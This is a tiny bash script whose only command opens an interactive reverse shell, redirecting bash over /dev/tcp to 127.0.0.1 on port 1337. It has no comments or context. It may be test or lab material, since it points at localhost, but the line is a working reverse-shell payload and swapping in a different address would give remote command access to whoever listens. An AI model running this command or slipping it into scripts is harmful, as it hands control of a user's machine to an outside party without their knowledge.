#!/bin/bash

/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
